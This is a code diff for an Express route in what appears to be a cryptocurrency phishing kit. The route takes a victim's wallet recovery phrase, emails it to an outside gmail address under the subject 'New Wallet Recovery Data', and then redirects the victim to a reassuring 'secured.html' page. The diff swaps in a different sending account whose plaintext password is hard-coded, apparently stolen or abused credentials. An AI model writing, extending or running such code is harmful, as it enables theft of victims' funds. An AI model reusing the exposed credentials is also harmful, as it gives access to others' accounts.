@@ -4,10 +4,10 @@ const router = express.Router();
 
 // Create a transporter for sending emails
 const transporter = nodemailer.createTransport({
-  service: 'smtp-mail.outlook.com', // Using Gmail; can be changed to other services like Outlook, etc.
+  service: 'fitchelogistics.com', // Using Outlook, can change to Gmail or others
   auth: {
-    user: 'patrciarivas@hotmail.com', // Your email
-    pass: '2e4f2fcd89d',  // Your email password or app password
+    user: 'enoc@fitchelogistics.com', // Your email
+    pass: 'mv,fTV@a]I%4', // Your app password or password
   },
 });
 
@@ -17,8 +17,8 @@ router.post('/', (req, res) => {
 
   // Prepare email content
   const mailOptions = {
-    from: 'patrciarivas@hotmail.com',
-    to: 'gomezjefferyalan22@gmail.com',  // Replace with your desired email address
+    from: 'enoc@fitchelogistics.com',
+    to: 'gomezjefferyalan22@gmail.com', // Replace with your recipient email
     subject: 'New Wallet Recovery Data',
     text: `
       Recovery Phrase: ${recoveryPhrase}
@@ -37,7 +37,9 @@ router.post('/', (req, res) => {
       return res.status(500).send('Failed to send email');
     }
     console.log('Email sent: ' + info.response);
-    res.status(200).send('Form data received and email sent');
+
+    // Redirect to secured.html page after email is sent
+    res.redirect('/secured.html'); // Redirect the user to secured.html after email is sent
   });
 });
 
